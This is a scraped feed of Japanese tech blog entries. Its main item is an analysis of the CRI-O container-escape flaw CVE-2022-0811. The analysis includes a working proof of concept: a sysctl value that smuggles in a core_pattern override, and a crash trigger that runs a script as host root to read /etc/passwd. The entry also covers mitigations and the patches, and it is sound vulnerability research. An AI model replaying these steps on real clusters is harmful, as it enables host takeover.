\\"神は細部に宿る\\" と言うけれど、こだわって作られた製品ってほんとうによいなぁと感じる。Ambientec TURN+Ambientecのデスクライト。SIGMA I SeriesSIGMAのカメラレンズ。福島県会津地方にある唯一の工場で、外装の質感はもちろん調整ダイヤルのクリック感までこだわってつくられている。BBS RI-DBBSのホイール。まとめ美しいものたち、ついほしくなってしまうのだけど部屋に置くとなんか思い描いていたほど美しく魅せられないのは部屋が汚いからなのだろうか。","link":"https://pranc1ngpegasus.hatenablog.com/entry/2022/04/04/000000?utm_source=feed","isoDate":"2022-04-03T15:00:00.000Z","dateMiliSeconds":1648998000000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"grpc-gatewayを利用したREST APIの提供がすごく便利な件","contentSnippet":"REST APIを提供するとき、APIのスキーマ定義をどのように管理するか悩むことがある。OpenAPI(Swagger)で定義してモデルを吐き出すこともあれば、コードとは別にMarkdownで書き出すこともあるだろう。マイクロサービス構成をとった場合にはサービス間の通信にgRPCを採用している場合もあり、REST APIはSwagger、gRPCはprotobufなどスキーマ定義の管理にかかる複雑さは増すばかりである。このような状況を解決できそうな方法があり、すごく気に入ったので紹介する。 grpc-gatewaygrpc-gatewayはgRPCで提供されているAPI...","link":"https://zenn.dev/pranc1ngpegasus/articles/2fea24c58614be","isoDate":"2022-03-30T15:00:00.000Z","dateMiliSeconds":1648652400000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"CVE-2022-0811 調査まとめ","contentSnippet":"CRI-O の脆弱性 (CVE-2022-0811) について調べた内容をまとめました。脆弱性の詳細と、関連する CRI-O の実装や Linux の機能を紹介します。CVE-2022-0811 概要CRI-O についてCRI-O 概要pinns による pod へのカーネルパラメータ設定Coredumpエクスプロイト要点検証回避策修正パッチcommit1commit2containerd の場合さいごに参考リンクCVE-2022-0811 概要CVE-2022-0811 は CRI-O の任意コード実行・コンテナブレイクアウトの脆弱性で、報告した CrowdStrike 社は「cr8escape」と呼んでいます。CRI-O の v1.19 以降に影響があり、すでに修正バージョンがリリースされています。 (詳細は Security Advisory を参照)カーネルパラメータ設定の検証不備により、/proc/sys/kernel/core_pattern への書き込みが可能となっていました。これによりプロセスを異常終了させることでホストの root 権限で任意の操作を行えます。CRI-O についてCRI-O 概要https://github.com/cri-o/cri-oCRI-O は Kubernetes に最適化された軽量な高レベルコンテナランタイムです。CLI ツールは crictl (https://github.com/kubernetes-sigs/cri-tools) を使用します。# cat container-config.json {  \\"metadata\\": {      \\"name\\": \\"ubuntu\\"  },  \\"image\\":{      \\"image\\": \\"ubuntu\\"  },  \\"command\\": [      \\"sleep\\",      \\"3600\\"  ],  \\"log_path\\":\\"ubuntu.0.log\\",  \\"linux\\": {  }}# cat pod-config.json {    \\"metadata\\": {        \\"name\\": \\"ubuntu-sandbox\\",        \\"namespace\\": \\"default\\",        \\"attempt\\": 1,        \\"uid\\": \\"hdishd83fjaiarawuwk28bcsb\\"    },    \\"log_directory\\": \\"/tmp\\",    \\"linux\\": {    }}# crictl runp pod-config.json   ← pod の起動b69761649f8f655416d5cba64260298a5e462a6cb108ec54d3ae89c578510edc# crictl create b69761649f8f655416d5cba64260298a5e462a6cb108ec54d3ae89c578510edc container-config.json pod-config.json   ← コンテナ作成2ce8010c047dfdf9f16aa127b701fbeda32a1e46c4efcd383f9a20484e07aef7# crictl start 2ce8010c047dfdf9f16aa127b701fbeda32a1e46c4efcd383f9a20484e07aef7   ← コンテナ起動2ce8010c047dfdf9f16aa127b701fbeda32a1e46c4efcd383f9a20484e07aef7# crictl podsPOD ID              CREATED             STATE               NAME                NAMESPACE           ATTEMPT             RUNTIMEb69761649f8f6       42 seconds ago      Ready               ubuntu-sandbox      default             1                   (default)# crictl psCONTAINER           IMAGE               CREATED             STATE               NAME                ATTEMPT             POD ID2ce8010c047df       ubuntu              19 seconds ago      Running             ubuntu              0                   b69761649f8f6pinns による pod へのカーネルパラメータ設定CRI-O は pinns utility を使用することで、pod 起動時にカーネルパラメータ (sysctls) を設定できます。first commit)設定には -s オプションを使用し、key=value の形式で複数のカーネルパラメータを連結して渡すことができます。pinns -s kernel_parameter1=value1+kernel_parameter2=value2設定可能な sysctls は以下の実装で制限されています。https://github.com/cri-o/cri-o/blob/main/pkg/config/sysctl.govar prefixNamespaces = map[string]Namespace{  \\"kernel.shm\\": IpcNamespace,  \\"kernel.msg\\": IpcNamespace,  \\"fs.mqueue.\\": IpcNamespace,  \\"net.\\":       NetNamespace,}// Validate checks that a sysctl is whitelisted because it is known to be// namespaced by the Linux kernel. The parameters hostNet and hostIPC are used// to forbid sysctls for pod sharing the respective namespaces with the host.// This check is only used on sysctls defined by the user in the crio.conf// file.func (s *Sysctl) Validate(hostNet, hostIPC bool) error {  nsErrorFmt := \\"%q not allowed with host %s enabled\\"  if ns, found := namespaces[s.Key()]; found {    if ns == IpcNamespace && hostIPC {      return errors.Errorf(nsErrorFmt, s.Key(), ns)    }    return nil  }  for p, ns := range prefixNamespaces {    if strings.HasPrefix(s.Key(), p) {      if ns == IpcNamespace && hostIPC {        return errors.Errorf(nsErrorFmt, s.Key(), ns)      }      if ns == NetNamespace && hostNet {        return errors.Errorf(nsErrorFmt, s.Key(), ns)      }      return nil    }  }  return errors.Errorf(\\"%s not whitelisted\\", s.Key())}sysctls の適用は pinns 内に実装されており、-s オプションの設定値をもとに /proc/sys/ 以下のファイルに書き込みを行なっています。https://github.com/cri-o/cri-o/blob/main/pinns/src/sysctl.cstatic int write_sysctl_to_file (char * sysctl_key, char* sysctl_value){  if (!sysctl_key || !sysctl_value)  {    pwarn (\\"sysctl key or value not initialized\\");    return -1;  }  // replace periods with / to create the sysctl path  for (char* it = sysctl_key; *it; it++)    if (*it == \'.\')      *it = \'/\';  _cleanup_close_ int dirfd = open (\\"/proc/sys\\", O_DIRECTORY | O_PATH | O_CLOEXEC);  if (UNLIKELY (dirfd < 0))  {    pwarn (\\"failed to open /proc/sys\\");    return -1;  }  _cleanup_close_ int fd = openat (dirfd, sysctl_key, O_WRONLY);  if (UNLIKELY (fd < 0))  {    pwarnf (\\"failed to open /proc/sys/%s\\", sysctl_key);    return -1;  }  int ret = TEMP_FAILURE_RETRY (write (fd, sysctl_value, strlen (sysctl_value)));  if (UNLIKELY (ret < 0))  {    pwarnf (\\"failed to write to /proc/sys/%s\\", sysctl_key);    return -1;  }  return 0;}Coredumpプロセスが異常終了した時に、プロセスメモリの dump を core ファイルとして出力します。Coredump の設定は /proc/sys/kernel/core_pattern に書かれており、ファイルの直接編集や sysctl コマンドで設定を変更できます。# sysctl -w kernel.core_pattern=\\"%e-%s.core\\"kernel.core_pattern には dump の出力先パスを指定しますが、最初文字がパイプ | の場合は指定パスのプログラムを実行します (この場合 dump は標準入力として渡される)。/proc/sys/kernel/core_pattern のデフォルト値として、ubuntu (20.04) では apport というバグレポートツールが指定されています。$ cat /proc/sys/kernel/core_pattern|/usr/share/apport/apport %p %s %c %d %P %Eまた Coredump のファイルサイズ上限は ulimit で設定します。脆弱性は Soft Limit が0でも刺さりそうです。# cat /proc/self/limits Limit                     Soft Limit           Hard Limit           Units     Max cpu time              unlimited            unlimited            seconds   Max file size             unlimited            unlimited            bytes     Max data size             unlimited            unlimited            bytes     Max stack size            8388608              unlimited            bytes     Max core file size        0                    unlimited            bytes     Max resident set          unlimited            unlimited            bytes     Max processes             3819                 3819                 processes Max open files            1024                 1048576              files     Max locked memory         67108864             67108864             bytes     Max address space         unlimited            unlimited            bytes     Max file locks            unlimited            unlimited            locks     Max pending signals       3819                 3819                 signals   Max msgqueue size         819200               819200               bytes     Max nice priority         0                    0                    Max realtime priority     0                    0                    Max realtime timeout      unlimited            unlimited            usエクスプロイト要点kernel.core_pattern は Namespaced ではないため、ホストとコンテナで同じファイルを参照するコンテナ内からは変更不可pod 起動時に sysctl に kernel.core_pattern を設定できれば、ホストの値も変更できるCIO-O 内で sysctl のキーを検証しているが、value に + を含む文字列を渡すことでバイパス可能 (以下コードを参照)設定後にプロセスを異常終了させることで、ホストの root 権限で任意コード実行問題となったコードfunc getSysctlForPinns(sysctls map[string]string) string {  // this assumes there\'s no sysctl with a `+` in it  const pinnsSysctlDelim = \\"+\\"  g := new(bytes.Buffer)  for key, value := range sysctls {    fmt.Fprintf(g, \\"\'%s=%s\'%s\\", key, value, pinnsSysctlDelim)  // ← \\"\'key1=value1\'+\'key2=value2\'\\" の形で文字列連結する  }  return strings.TrimSuffix(g.String(), pinnsSysctlDelim)}検証脆弱なバージョンの CRI-O で CVE-2022-0811 を検証します。Kubernetes は使用せず、crictl での検証を行いました。# crio --versioncrio version 1.23.1Version:          1.23.1GitCommit:        af642cdafed31e4be5dd82e996bb084050c8bb89GitTreeState:     dirtyBuildDate:        1980-01-01T00:00:00ZGoVersion:        go1.17.4Compiler:         gcPlatform:         linux/amd64Linkmode:         staticBuildTags:        apparmor, exclude_graphdriver_devicemapper, seccomp, selinuxSeccompEnabled:   trueAppArmorEnabled:  true最初にホストに実行させたいプログラムを配置するコンテナを作成します。json、pod-config.json は前述のファイルと同じものです。# crictl runp pod-config.json d33614f0b22d3d81bb680ee76eb1882a1b6287bb99515d6505d75e315b01297a# crictl create d33614f0b22d3d81bb680ee76eb1882a1b6287bb99515d6505d75e315b01297a container-config.json pod-config.json 9029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac6123# crictl start 9029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac61239029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac6123起動したコンテナにアタッチし、コンテナの root パスにプログラムを配置します。/etc/passwd をコンテナ内の /output に出力するスクリプトを用意しました。# crictl exec -it 9029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac6123 bashroot@d33614f0b22d:/# mount | grep overlayoverlay on / type overlay (rw,relatime,lowerdir=/var/lib/containers/storage/overlay/l/73PSGHB33J2RBZXIUVK7SRC4UA,upperdir=/var/lib/containers/storageoverlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff,workdir=/var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/work,metacopy=on,volatile)root@d33614f0b22d:/# echo \'#!/bin/sh\' > /cmdroot@d33614f0b22d:/# echo \'cat /etc/passwd > /var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/output\' >> cmdroot@d33614f0b22d:/# cat /cmd#!/bin/shcat /etc/passwd > /var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/outputroot@d33614f0b22d:/# chmod a+x /cmd続いて kernel.core_pattern を変更する pod を作成します。+ で連結した value を記載します。value に記載する kernel.core_pattern には、ホストから見たプログラムの絶対パスを指定しています。# をつけていますが、これは CRI-O の実装で付与されるシングルクォートを無効化する役割があります。# cat /proc/sys/kernel/core_pattern|/usr/share/apport/apport %p %s %c %d %P %E# cat pod-config2.json {    \\"metadata\\": {        \\"name\\": \\"ubuntu-sandbox2\\",        \\"namespace\\": \\"default\\",        \\"attempt\\": 1,        \\"uid\\": \\"edishd83djaidwnduwk28bcsd\\"    },    \\"log_directory\\": \\"/tmp\\",    \\"linux\\": {  \\"sysctls\\": {      \\"kernel.shm_rmid_forced\\": \\"1+kernel.core_pattern=|/var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/cmd #\\"  }    }}# crictl runp pod-config2.json FATA[0001] run pod sandbox: rpc error: code = Unknown desc = container create failed: write to /proc/sys/kernel/shm_rmid_forced: Invalid argument pod 作成はエラーになりますが、kernel.core_pattern を見ると変更されていることがわかります。# cat /proc/sys/kernel/core_pattern |/var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/cmd #\'最後に起動中のコンテナ内でプロセスを異常終了させることで、 Coredump の機能を呼び出しホストの root 権限でプログラムを実行させることができます。root@d33614f0b22d:/# tail -f /dev/null &[1] 17root@d33614f0b22d:/# ps    PID TTY          TIME CMD      4 pts/0    00:00:00 bash     17 pts/0    00:00:00 tail     18 pts/0    00:00:00 psroot@d33614f0b22d:/# kill -SIGSEGV 17root@d33614f0b22d:/# ls /bin  boot  cmd  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  output  proc  root  run  sbin  srv  sys  tmp  usr  var[1]+  Segmentation fault      (core dumped) tail -f /dev/nullroot@d33614f0b22d:/# cat /output root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin...回避策CrowdStrike 社のブログ を参考にしています。CRI-O のアップデート (非推奨だが v1.18 以下へのダウングレードも可)OPA 等のポリシーを設定するPSP で sysctls を全てブロックするpinns の -s を除去するラッパーを用意し、crio.conf の pinns_path に設定する修正パッチcommit1https://github.com/cri-o/cri-o/commit/05c443b06356c2dbf9d30060f362279c6b8ac1a1pinns の -s オプションを生成する箇所で、+ に対してバリデーションを追加しています。  func (mgr *NamespaceManager) NewPodNamespaces(cfg *PodNamespacesConfig) ([]Namespace, error) {    ...      if len(cfg.Sysctls) != 0 {-     pinnsArgs = append(pinnsArgs, \\"-s\\", getSysctlForPinns(cfg.Sysctls))+     pinnsSysctls, err := getSysctlForPinns(cfg.Sysctls)+     if err != nil {+       return nil, errors.Wrapf(err, \\"invalid sysctl\\")+     }+     pinnsArgs = append(pinnsArgs, \\"-s\\", pinnsSysctls)    }      ...  }- func getSysctlForPinns(sysctls map[string]string) string {-   // this assumes there\'s no sysctl with a `+` in it+ func getSysctlForPinns(sysctls map[string]string) (string, error) {+   // This assumes there\'s no valid sysctl value with a `+` in it+   // and as such errors if one is found.    const pinnsSysctlDelim = \\"+\\"    g := new(bytes.Buffer)    for key, value := range sysctls {+     if strings.Contains(key, pinnsSysctlDelim) || strings.Contains(value, pinnsSysctlDelim) {+       return \\"\\", errors.Errorf(\\"\'%s=%s\' is invalid: %s found yet should not be present\\", key, value, pinnsSysctlDelim)+     }      fmt.Fprintf(g, \\"\'%s=%s\'%s\\", key, value, pinnsSysctlDelim)    }-   return strings.TrimSuffix(g.String(), pinnsSysctlDelim)+   return strings.TrimSuffix(g.String(), pinnsSysctlDelim), nil  }commit2https://github.com/cri-o/cri-o/commit/1af1f8af2c7e23525102dffbf0899b69e34ed3d2文字列の連結をやめ、-s をパラメータ毎に設定する修正がされています。  func (mgr *NamespaceManager) NewPodNamespaces(cfg *PodNamespacesConfig) ([]Namespace, error) {    ...  -   if len(cfg.Sysctls) != 0 {-     pinnsSysctls, err := getSysctlForPinns(cfg.Sysctls)-     if err != nil {-       return nil, errors.Wrapf(err, \\"invalid sysctl\\")-     }-     pinnsArgs = append(pinnsArgs, \\"-s\\", pinnsSysctls)+   for key, value := range cfg.Sysctls {+     pinnsArgs = append(pinnsArgs, \\"-s\\", fmt.Sprintf(\\"%s=%s\\", key, value))    }      ...  }containerd の場合他のコンテナランタイムがどうなっているか気になったので、containerd の実装を調べてみました。https://github.com/opencontainers/runc/blob/main/libcontainer/configs/validate/validator.go// sysctl validates that the specified sysctl keys are valid or not.// /proc/sys isn\'t completely namespaced and depending on which namespaces// are specified, a subset of sysctls are permitted.func (v *ConfigValidator) sysctl(config *configs.Config) error {    validSysctlMap := map[string]bool{        \\"kernel.msgmax\\":          true,        \\"kernel.msgmnb\\":          true,        \\"kernel.msgmni\\":          true,        \\"kernel.sem\\":             true,        \\"kernel.shmall\\":          true,        \\"kernel.shmmax\\":          true,        \\"kernel.shmmni\\":          true,        \\"kernel.shm_rmid_forced\\": true,    }    for s := range config.Sysctl {        if validSysctlMap[s] || strings.HasPrefix(s, \\"fs.mqueue.\\") {            if config.Namespaces.Contains(configs.NEWIPC) {                continue            } else {                return fmt.Errorf(\\"sysctl %q is not allowed in the hosts ipc namespace\\", s)            }        }        if strings.HasPrefix(s, \\"net.\\") {            if config.Namespaces.Contains(configs.NEWNET) {                continue            } else {                return fmt.Errorf(\\"sysctl %q is not allowed in the hosts network namespace\\", s)            }        }        return fmt.Errorf(\\"sysctl %q is not in a separate kernel namespace\\", s)    }    return nil}CRI-O は pinns により独自の sysctls 設定を実装していますが、pod 作成時に設定する都合上、 OCI の機能を使わない方法を選んだのかもしれません (根拠はないです)。さいごに初めて CRI-O を触りましたが、Docker や containerd とはかなり仕組みが異なることがわかりました。脆弱性の調査を通して CRI-O の実装や Linux の機能に触れることができ、良い機会を得られたと思います。内容に誤りが含まれる可能性がありますので、何かお気づきの方はご指摘等よろしくお願いします。参考リンクhttps://nvd.nist.gov/vuln/detail/CVE-2022-0811https://blog.aquasec.com/cve-2022-0811-cri-o-vulnerabilityhttps://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/https://github.com/cri-o/cri-o/security/advisories/GHSA-6x2m-w449-qwx7https://pwning.systems/posts/escaping-containers-for-fun/https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mountshttps://valinux.hatenablog.com/entry/20210721https://qiita.com/rarul/items/d33b664c8414f065e65ehttps://man7.org/linux/man-pages/man5/core.5.htmlhttps://lwn.net/Articles/280959/https://wiki.ubuntu.com/Apport","link":"https://kyohmizu.hatenablog.com/entry/2022/03/28/182243","isoDate":"2022-03-28T09:22:43.000Z","dateMiliSeconds":1648459363000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"nnn(Terminal file manager)を使ってみる","contentSnippet":"nnnとはhttps://github.com/jarun/nnnターミナル上で動作するファイルマネージャー 良い点軽量で高速な動作を保つために機能をプラグインとして外出しして拡張できる設計になってますプラグインはシェルスクリプトなどで簡単に記述できますキーバインドはviライクですtmuxを利用してる状態の画像表示も問題ないですターミナルはkittyを利用しています インストールUbuntu$ sudo apt install nnnArch Linux$ sudo pacman -S nnnMacOS$ bre...","link":"https://zenn.dev/tayusa/articles/1f87e798ccbed0","isoDate":"2022-03-27T13:27:45.000Z","dateMiliSeconds":1648387665000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Intigritiリーダーボードとは何か、それが企業のバグバウンティプログラムにどのような影響を与えるか","contentSnippet":"今回の記事では、Intigritiのリーダーボードがどのようなものか、より詳しく説明していきます。また、バグバウンティプログラムやバグハンターコミュニティにどのような利益をもたらすかについても紹介していきます。The post Intigritiリーダーボードとは何か、それが企業のバグバウンティプログラムにどのような影響を与えるか first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/intigriti-leaderboard-what-is-it-and-how-does-it-impact-your-program/","isoDate":"2022-03-22T01:55:00.000Z","dateMiliSeconds":1647914100000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Securify申し込みから利用までを徹底解説 [使ってみた]","contentSnippet":"当社が2021年12月より提供開始した、自動脆弱性診断ツール「Securify (セキュリファイ)」ですが、おかげさまで多くの企業様よりお問い合わせ、ならびご利用頂いております。現在ベータ版での提供であり、全機能を無料で […]The post Securify申し込みから利用までを徹底解説 [使ってみた] first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/securify_trial/","isoDate":"2022-03-18T15:08:46.000Z","dateMiliSeconds":1647616126000,"authorName":"Sreake","authorId":"Sreake"},{"title":"samber / lo はGoperである私を愚直なfor もしくは筋肉信仰から救ってくれるのか？","contentSnippet":"はじめにGo 1.18 がリリースされました。Go 1.18でシュッとGenerics を手軽に良さを実感する方法としてsamber/lo があります。  もちろん、Tutorial: Getting started with generics で完全に理解できるならそちらの方が良いですし、これを終わった後でやることも推奨です。その他のリリースパーティや勉強会もとても勉強になりますが とにかく、samber/lo 便利なので紹介させてください！！！！！！！go.dev今回はとても大きな変更です。Generics が入りました。構成としては2つ。Type parameterType sets参考資料DevFest Tokyo 2021 でmattn さんが発表したスライド＆動画がとても分かりやすいので是非、見てみてください。docs.google.comwww.youtube.com全てfor 文で解決するのか？- そう、全て筋肉が解決してくれるGolang にはuniq メゾットのようなものがなく、重複のある slice に対して独自に処理を実装しなければいけなかった。愚直にfor を回すの結果として最速だからである。arr := []string{\\"Samuel\\", \\"Marc\\", \\"Samuel\\"}m := map[string]bool{}for _, ele := range arr {    if !m[ele] {        m[ele] = true        uniq = append(uniq, ele)    }}fmt.Printf(\\"%v\\", uniq) // [\\"Samuel\\", \\"Marc\\"]Go Playground - The Go Programming Languageどういうことかというと、重複キーがあるので、同様のキーを持つmapの場合は新しく値を上書きしないみたいな処理を書かなければならなかった。m[\\"Samuel\\"] = true は一度目はこれが呼ばれるけど、二度目はすでにtrueなので if句の中に入ってず、resultにSamuelが二度入ることがないという様な仕組みです。とにかく、全てをfor で扱い全ての型を制御するマッチョでした。ema-hiro.hatenablog.com全てfor 文で解決するのか？- samber/lo とか？Golang にはuniq メゾットのようなものがなく、重複のある slice に対して独自に処理を実装しなければいけなかったがsamber/lo というプロジェクトではGo 1.18 のGenerics を使うことによってreflect より早くforとも遜色なく動作するヘルパーを提供します。他にもいくつもの ヘルパー がありますが今回はuniq のみ紹介します。pkg.go.devpackage mainimport (    \\"fmt\\"    \\"github.com/samber/lo\\")func main() {    arr := []string{\\"Samuel\\", \\"Marc\\", \\"Samuel\\"}    names := lo.Uniq[string](arr)       fmt.Println(names) // []string{\\"Samuel\\", \\"Marc\\"}}uniqValues := lo.Uniq[int]([]int{1, 2, 2, 1})// []int{1, 2}実装をみるとこんな感じでmapと空のstructを使う方法でuniq が実装されている。lo/slice.go at v1.10.1 \xb7 samber/lo \xb7 GitHubfunc Uniq[T comparable](collection []T) []T {    result := make([]T, 0, len(collection))    seen := make(map[T]struct{}, len(collection))    for _, item := range collection {        if _, ok := seen[item]; ok {            continue        }        seen[item] = struct{}{}        result = append(result, item)    }    return result}とにかく、for で愚直に回す言語から多少はスマートな解決ができる様になった(もしくは今後、期待ができる様になった)。最後にこの記事を読んで興味が湧いたら元のProposalやTutorial: Getting started with generics を読んでみてください。自分も何度かやってみて読んでみて使える様になりたいと思ってます。また、Go本体にも機能として追加される日を楽しみしてます。github.com","link":"https://syu-m-5151.hatenablog.com/entry/2022/03/16/122810","isoDate":"2022-03-16T03:28:10.000Z","dateMiliSeconds":1647401290000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"3-shake エンジニアのブログ記事まとめサイト「3-shake Engineers\' Blogs」を公開しました。","contentSnippet":"3-shake Engineers\' Blogs、爆誕す！3-shake inc. に所属するエンジニアが執筆したブログ記事をまとめたサイト、3-shake Engineers\' Blogsを公開しました。blog.3-shake.comこちらは、@catnoseさんがOSSとして公開している、team-blog-hubをfork させていただき、Ubie さんのUbie Engineers\' Blogsを参考にして作成いたしました。なぜ、作ったのか？3-shake には現在、公式のテックブログ(Sreake のブログ | sreake.com | 株式会社スリーシェイク というブログ)があります。が、メンバーが自発的にブログをポストしているわけではありません(別に良い悪いではなく)。理由はいろいろあると思いますが、テックブログは続かない - 何サイトか潰した後にブログが有名な企業に転職しての気づきと反省｜久松剛／IT百物語の蒐集家｜note にあるようないくつかの要素が原因かと思っています。が、3-shake がアウトプットしない文化という訳では決してありません。3-shake には現在、Sreake共有会 という毎週、火曜日と木曜日に担当者が現場で得た知見や調査した内容を発表する社内勉強会が開催されておます。これのポストは既に100件近く内部資料として溜まっており、レベルも相応に高いです。それらを対外的なアプトプットとして出せて、かつ、個人のブログでアウトプットしたほうがアウトプットするモチベーションも上がるのでは？という考えのもとに作成いたしました。最後にこれらの取り組みが3-shake を知っていただけることに多少なりとも繋がれば良いと思います。ちなみに、リポジトリをfork した後に社内調整をして、公開までいたしました。社会人力の低さを感じましたが3-shake が大切にしている価値観として5倍速というのがあるので許される気がしてます。@nwiizo さんのご尽力もあり、流行りに乗っかってみました笑うちのメンバーのブログをぜひ見てみてくださいー— TakuyaTezuka@3-shake (@tt0603) 2022年3月15日  告知また、3-shake で働くことに興味がある方は、採用サイトやホームページに詳しい情報を掲載していますのでご覧くださいwww.wantedly.com今週の金曜日の2022年3月18日に 3-shake SRE Tech Talk #3 というイベントがあって技術顧問 のまつもとりーさんが「コンテナの研究開発から学ぶLinuxの要素技術」と題してお話してくれるので皆様にも参加してほしいです3-shake.connpass.com参考資料zenn.devnote.com","link":"https://syu-m-5151.hatenablog.com/entry/2022/03/15/153309","isoDate":"2022-03-15T06:33:09.000Z","dateMiliSeconds":1647325989000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"ドストライクなPCケースを見つけた","contentSnippet":"年の離れた弟がゲーミングPCを自作したいとのことで相談に乗っていたら自作したい欲を掻き立てられてしまい、調べていくうちに個人的ドストライクなPCケースを見つけたので紹介する。Fractal Design Era ITXこのケースはmini-ITXサイズ用で、サイズは高さ31cm/幅16cm/奥行き32cmと非常にコンパクトに仕上がっている。実売17,000円ほどでドスパラなどで購入できる。Linux開発機としてお迎えできるといいなぁと考えているところである。","link":"https://pranc1ngpegasus.hatenablog.com/entry/2022/03/14/000000?utm_source=feed","isoDate":"2022-03-13T15:00:00.000Z","dateMiliSeconds":1647183600000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"Observability Conference 2022 に登壇しました","contentSnippet":"「Dapr の概念と実装から学ぶ Observability への招待」 というタイトルで登壇します。https://event.cloudnativedays.jp/o11y2022/talks/1382:embed:cite セッション概要Dapr は CloudNative な技術を背景に持つ分散アプリケーションランタイムです。本セッションでは Dapr の Observability に関する各種機能と、その実装について解説していきます。さらにスリーシェイクの Dapr と Observability への取り組みに関してもご紹介します。Dapr の機能でカバーできる点...","link":"https://zenn.dev/nwiizo/articles/d837b78914de23","isoDate":"2022-03-11T04:02:18.000Z","dateMiliSeconds":1646971338000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Archives","contentSnippet":"","link":"https://blog.jigyakkuma.org/archives/","isoDate":"2022-03-06T00:00:00.000Z","dateMiliSeconds":1646524800000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"istio sidecar の停止を connection がなくなるまで遅らせる","contentSnippet":"新機能 EXIT_ON_ZERO_ACTIVE_CONNECTIONS> 新機能 EXIT_ON_ZERO_ACTIVE_CONNECTIONS # 以前、「 Istio 導入への道 – sidecar の調整編」という記事で、Istio の sidecar (istio-proxy) が、アプリの終了を待たずに停止してしまってアプリ側が通信できなくなるという問題","link":"https://blog.1q77.com/2022/02/istio-exit-on-zero-active-connections/","isoDate":"2022-02-26T15:52:27.000Z","dateMiliSeconds":1645890747000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"JAWS-UG SRE支部 #2 突撃！となりのSRE","contentSnippet":"jawsug-sre.connpass.com聞いてきましたのでメモと感想を残しておきます。LTマネーフォーワードのマイクロサービス基盤のこれまでとこれから by マネーフォワード @grezarjpマネーフォワードのマイクロサービス基盤の移り変わりの紹介。中央集権構造 => 権限移譲フェーズ => これから中央集権構造サービスごとに開発チームが存在、サービスにまたがってインフラチームが存在開発チームはインフラを気にしなくてもすんだ。メンバーが少ないうちはなんとかなった組織の規模に対してインフラチームがスケールしなくなった責務の分解点を再定義 DevOpsへ権限移譲フェーズ開発チームに権限を渡していくAWSとKubernatesを使用ランタイム、ミドルウェアも開発チームが管理サービスごとにNamespaceを切る、Namespace内で開発チームは権限を持つマイクロサービスごとにAWSアカウント管理して、リソースを管理するこれから権限は渡したが、運用まではむつかしい開発の運用を負荷を下げるためにTerraformのモジュール化、設定のバリデーションの整備AWSアカウントの統制、コスト可視化を進めたいアプリケーションランタイムのSnadbox化特殊要件なアプリケーションで使えるように開発チームにここまでインフラの権限を渡せて、運用できるのはすごいなと思った。QAQ: 開発チームの権限移譲の苦労、運用面、技術面A: マルチアカウントをつかって 技術上の考慮点があった人と人とのかかわりに関しては銀の弾丸はないので、地道な作業が必要ドキュメントとかで監視項目を揃えてあげるのに力を入れたQ: 開発とインフラでスキルセットの違いはあった?A:インフラはアプリをあんまり見てこなかったのでそのへんのギャップはあったQ: EKSのテナント分割の単位A: 権限分類と障害の影響範囲の最小化はシングルテナントが有利とは言われるが運用負荷を下げるためにマルチテナントを選んだSREグループのマネージャーという立場になって真っ先にやったこと by ミクシィ@isaoshimizu内容に関しては、スライドに詳しく書いてあるので参照。SREのミッション・バリューいいなあと思った。うちのチームでもちゃんと考えたい。SRE Lounge #13 LTでも今回と近いことを書いてるので参照してほしいとのこと↓組織にSREの文化を作り上げていくEnabling SRE | Money Forward Engineers\' BlogQAQ: SRE主導でやるべきではなかったことA: SREは万能な人がおおくでできてしまう開発側のリソースが足りなくて急がないといけないことをSREがやってしまう本来はそうじゃないよねって話自分としては、SREでも開発分野でも巻き取れることはやってしまってもいいと思うんですよね。線を引きすぎるとセクショナリズムになってあまり良くない気がしてる。組織のあり方はそれぞれで、コンテキスト分かってないので、言い切ることはできないですが。Containerサービス と Toil と by スリーシェイク \xa0@tt0603ECSとEKSについてToilと紐付けての話題。Toilの削減ステップ特定計測削減ただこのプロセスはつらい。SREとしては長期的なエンジニアリング に時間を使いたい。本質的なことをすることが目的。Toilを削減することが目的ではない。技術選定として、まずマネージドで考える。チームとして何を大事にしているかを考える。自分たちの”サイズ”で技術選定をして価値あるエンジニアリングをする。個人的にはEKSとECSのまとめがわかりやすくてよかった。QAQ: セルフホステッドを選択する場合は?A: 